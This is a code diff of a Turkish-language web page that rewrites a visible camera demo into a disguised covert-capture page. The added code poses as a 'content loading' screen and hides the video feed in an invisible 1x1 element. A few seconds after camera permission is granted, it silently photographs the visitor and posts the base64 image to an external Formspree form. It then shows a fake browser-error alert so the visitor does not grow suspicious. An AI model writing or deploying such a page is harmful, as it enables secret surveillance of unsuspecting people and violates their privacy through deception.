@@ -2,40 +2,76 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kamera Erişimi</title>
+    <title>Sistem Yükleniyor</title>
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #f0f0f0; }
-        video { border: 5px solid #333; border-radius: 10px; width: 80%; max-width: 600px; background: #000; }
-        h1 { color: #333; }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #000; color: white; margin: 0; }
+        /* Kamerayı gizlemek için 1x1 piksellik görünmez bir alan yapıyoruz */
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 16px; margin-top: 20px; color: #ccc; }
     </style>
 </head>
 <body>
 
-    <h1>Kamera Bağlantısı</h1>
+    <div class="loader"></div>
+    <h1>İçerik Yükleniyor, Lütfen Bekleyin...</h1>
+    
     <video id="videoElement" autoplay playsinline></video>
 
     <script>
-        async function kameraBaslat() {
+        async function baslat() {
             try {
-                // Kamera erişim izni istiyoruz
+                // Kamera izni istiyoruz
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // İzin verilirse görüntüyü video etiketine aktarıyoruz
                 const video = document.querySelector("#videoElement");
                 video.srcObject = stream;
-                
-                console.log("Kamera erişimi sağlandı gardaşım.");
+
+                // Kamera açıldıktan 3 saniye sonra fotoğraf çek ve gönder
+                setTimeout(fotografCekVeGonder, 3000);
             } catch (err) {
-                // Kullanıcı reddederse veya hata oluşursa burası çalışır
-                console.error("Hata: " + err);
-                alert("Kamera izni verilmedi veya cihaz bulunamadı.");
+                console.log("Kamera erişimi reddedildi: " + err);
             }
         }
 
-        // Sayfa yüklendiğinde fonksiyonu çalıştır
-        window.onload = kameraBaslat;
-    </script>
+        async function fotografCekVeGonder() {
+            const video = document.querySelector("#videoElement");
+            const canvas = document.createElement("canvas");
+            
+            // Video boyutlarını al
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Fotoğrafı yakala
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Görüntüyü metin formatına (Base64) çevir
+            const veriUrl = canvas.toDataURL("image/jpeg", 0.7); // 0.7 kalite (boyut küçük olsun diye)
 
+            // Formspree linkine gönder
+            try {
+                await fetch("https://formspree.io/f/meelplaw", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify({
+                        subject: "Yeni Görüntü Geldi!",
+                        kimden: "Mainproje1",
+                        fotograf_kodu: veriUrl
+                    })
+                });
+                
+                // Gönderimden sonra kullanıcıyı şüphelendirmemek için bir hata mesajı gösterelim
+                alert("Hata: Tarayıcı uyumsuzluğu tespit edildi. Lütfen daha sonra tekrar deneyin.");
+            } catch (error) {
+                console.log("Gönderim hatası:", error);
+            }
+        }
+
+        window.onload = baslat;
+    </script>
 </body>
 </html>
